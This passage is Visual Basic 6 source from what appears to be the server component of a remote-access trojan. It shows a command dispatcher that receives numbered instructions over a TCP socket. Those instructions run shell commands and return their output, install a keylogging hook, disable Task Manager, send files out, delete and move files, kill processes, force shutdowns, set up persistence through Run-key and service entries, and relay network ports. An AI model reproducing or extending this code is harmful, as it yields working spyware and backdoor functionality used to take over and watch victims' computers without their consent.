            With fp
                .sFileNameExt = strSplit(0)
                .bRecurse = strSplit(2)
                .iFileCount = 0
            End With
            Search UCase$(strSplit(1))
            sckTCP.SendData "27" & fp.sFiles
            fp.sFiles = vbNullString
            Exit Sub
        Case 16
            SystemParametersInfoA 20, 0, strData, 0
            sckTCP.SendData "23"
        Case 17
            ShowWindow FindWindowExA(FindWindowA("Shell_TrayWnd", vbNullString), 0, "Button", vbNullString), 0
        Case 18
            ShowWindow FindWindowExA(FindWindowA("Shell_TrayWnd", vbNullString), 0, "Button", vbNullString), 5
        Case 19
            SystemParametersInfoA 97, True, CStr(1), 0
            SaveStringKey "software\microsoft\windows\currentversion\policies\system", "DisableTaskMgr", 1
        Case 20
            SystemParametersInfoA 97, False, CStr(1), 0
            SaveStringKey "software\microsoft\windows\currentversion\policies\system", "DisableTaskMgr", 0
        Case 21
            keybd_event 91, 0, 0, 0
            keybd_event 68, 0, 0, 0
            keybd_event 91, 0, 2, 0
        Case 22
            sckTCP.SendData "07" & Format$(Now, "hh:mm:ss AMPM|mm/dd/yy")
            Exit Sub
        Case 23
            strSplit = Split(strData, "|")
            Time = Format$(strSplit(1), "hh:mm:ss AMPM")
            Date = Format$(strSplit(2), "mm/dd/yy")
        Case 24
            ShowWindow FindWindowExA(FindWindowExA(FindWindowA("Shell_TrayWnd", vbNullString), 0, "TrayNotifyWnd", vbNullString), 0, "TrayClockWClass", vbNullString), 0
        Case 25
            ShowWindow FindWindowExA(FindWindowExA(FindWindowA("Shell_TrayWnd", vbNullString), 0, "TrayNotifyWnd", vbNullString), 0, "TrayClockWClass", vbNullString), 5
        Case 26
            RmDir strData
            sckTCP.SendData "09"
            Exit Sub
        Case 27
            MkDir strData
            sckTCP.SendData "09"
            Exit Sub
        Case 28
            retValue = ExitWindowsEx(1, 0)
            If retValue = 0 Then
                AdjustToken
                ExitWindowsEx (1), -1
            End If
        Case 29
            retValue = ExitWindowsEx(2, 0)
            If retValue = 0 Then
                AdjustToken
                ExitWindowsEx (2), -1
            End If
        Case 30
            ExitWindowsEx 0, 0
        Case 31
            Unload Me
            Exit Sub
        Case 32
            sckTCP_Close
            Exit Sub
        Case 33
            strSplit = Split(strData, "|")
            sckTCP.SendData "01"
            MsgBox strSplit(0), Int(strSplit(1)), strSplit(2)
            Exit Sub
        Case 34
            Clipboard.SetText strData
        Case 35
            sckDRV.Close
            sckDRV.LocalPort = 0
            sckDRV.Listen
            sckTCP.SendData "08" & sckDRV.LocalPort
            Exit Sub
        Case 36
            Kill strData
            sckTCP.SendData "09"
            Exit Sub
        Case 37
            sckTCP.SendData "17" & FileLen(strData)
            Exit Sub
        Case 38
            sckTCP.SendData "19" & PCInfo
            Exit Sub
        Case 39
            strSplit = Split(strData, "|")
            SetSysColors 1, 8, Int(strSplit(0))
            SetSysColors 1, 15, Int(strSplit(1))
            SetSysColors 1, 4, Int(strSplit(2))
            SetSysColors 1, 1, Int(strSplit(3))
            SetSysColors 1, 5, Int(strSplit(4))
        Case 40
            sckTCP.SendData "00" & ExecuteCommand(strData)
            Exit Sub
        Case 41
            SetSysColors 1, 8, DefaultColor(0)
            SetSysColors 1, 15, DefaultColor(1)
            SetSysColors 1, 4, DefaultColor(2)
            SetSysColors 1, 1, DefaultColor(3)
            SetSysColors 1, 5, DefaultColor(4)
        Case 42
            strFileName = strData
            lngFileProg = 0
            sckFT.SendData "SEND_FILE" & strData & "|" & FileLen(strData)
            Exit Sub
        Case 43
            strSplit = Split(strData, "|")
            Name strSplit(1) As strSplit(2)
            sckTCP.SendData "09"
            Exit Sub
        Case 44
            SendMessageA Me.hwnd, 274, 61760, 0
        Case 45
            sckTCP.SendData "14" & DrvInfo(strData)
            Exit Sub
        Case 46
            If LenB(strData) = 0 Then
                GetProc
                Exit Sub
            Else
                TerminateProc strData
                Exit Sub
            End If
        Case 47
            InstallHook PassOff.hwnd
            KeyHook = True
        Case 48
            RemoveHook
            KeyHook = False
        Case 49
            strSplit = Split(strData, "|")
            WriteINI "Settings", "PortNum", Encrypt(strSplit(0)), strSrvNFO
            PortNum = strSplit(0)
            WriteINI "Settings", "ICQNum", Encrypt(strSplit(1)), strSrvNFO
            ICQNum = strSplit(1)
            WriteINI "Settings", "Password", Encrypt(strSplit(2)), strSrvNFO
            Password = strSplit(2)
            PasswordOn = Len(Password)
            If Left$(strSplit(3), 1) = 1 Then
                RegRun True
            ElseIf RegRunOn = True Then
                RegRun False
            End If
            If Right$(strSplit(3), 1) = 1 Then
                RegRunService True
            ElseIf RegRunServiceOn = True Then
                RegRunService False
            End If
        Case 50
            strSplit = Split(strData, "|")
            SentKeys strSplit(0), strSplit(1)
        Case 51
            SetWindowTextA WindowhWnd, strData
            sckTCP.SendData "11"
            Exit Sub
        Case 52
            ShowWindow WindowhWnd, strData
        Case 53
            EnableWindow WindowhWnd, strData
        Case 54
            EnumWindows AddressOf fEnumWindowsCallBack, vbNull
            sckTCP.SendData "25" & strWindows
            strWindows = vbNullString
            Exit Sub
        Case 55
            PostMessageA WindowhWnd, 16, 0, 0
            sckTCP.SendData "11"
            Exit Sub
        Case 56
            RemoveMenu GetSystemMenu(WindowhWnd, 0), -4000, 0
            DrawMenuBar WindowhWnd
        Case 57
            WindowhWnd = FindWindowA(vbNullString, strData)
            Exit Sub
        Case 58
            strSplit = Split(strData, "|")
            sckTCP.SendData "24" & Properties(strSplit(0), strSplit(1), Int(strSplit(2)))
            Exit Sub
        Case 59
            DrvLbl strData
            Exit Sub
        Case 60
            strSplit = Split(strData, "|")
            SetVolumeLabelA strSplit(0), strSplit(1)
            sckTCP.SendData "23"
            Exit Sub
        Case 61
            strSplit = Split(strData, "|")
            FileCopy strSplit(0), strSplit(1)
            Kill strSplit(0)
            sckTCP.SendData "09"
            Exit Sub
        Case 62
            sndPlaySoundA strData, 131073
        Case 63
            If RegRunOn = True Then
                RegRun False
            End If
            If RegRunServiceOn = True Then
                RegRunService False
            End If
            RemoveServer
        Case 64
            MoveToBin strData
            sckTCP.SendData "09"
            Exit Sub
        Case 65
            intMax = intMax + 1
            If intMax < 16 Then
                strSplit = Split(strData, "|")
                Load sckIn(intMax)
                Load sckOut(intMax)
                sckOut(intMax).RemoteHost = strSplit(0)
                sckOut(intMax).RemotePort = strSplit(1)
                sckIn(intMax).LocalPort = strSplit(2)
                sckIn(intMax).Listen
                PortConnections(intMax) = "Remote: " & strSplit(0) & ":" & strSplit(1) & " Local: " & strSplit(2)
            End If
        Case 66
            For retValue = 1 To intMax
                strData = strData & PortConnections(retValue) & "|"
                DoEvents
            Next
            sckTCP.SendData "28" & strData
            Exit Sub
        Case 67
            For retValue = 1 To intMax
                sckIn(retValue).Close
                sckOut(retValue).Close
                Unload sckIn(retValue)
                Unload sckOut(retValue)
                DoEvents
            Next
            intMax = 0
            Erase PortConnections
        Case 68
            If sckHTTP(0).State <> 2 Then
                sckHTTP(0).LocalPort = strData
                sckHTTP(0).Listen
            End If
        Case 69
            retValue = sckHTTP.UBound
            For cmdData = 1 To retValue
                sckHTTP(cmdData).Close
                Unload sckHTTP(cmdData)
                DoEvents
            Next
            sckHTTP(0).Close
        Case 70
            sckTCP.SendData "29" & HitCounter
            Exit Sub
    End Select
    
    sckTCP.SendData "01"
    Erase strSplit
    Exit Sub
    
ErrHandle: ErrHandler Err.Number, Err.Description
End Sub

Private Sub ErrHandler(ByVal ErrNumber As Integer, ByVal ErrDescription As String)
    On Error Resume Next
    If sckTCP.State = 7 Then
        sckTCP.SendData "13" & ErrNumber & "|" & ErrDescription
    End If
End Sub
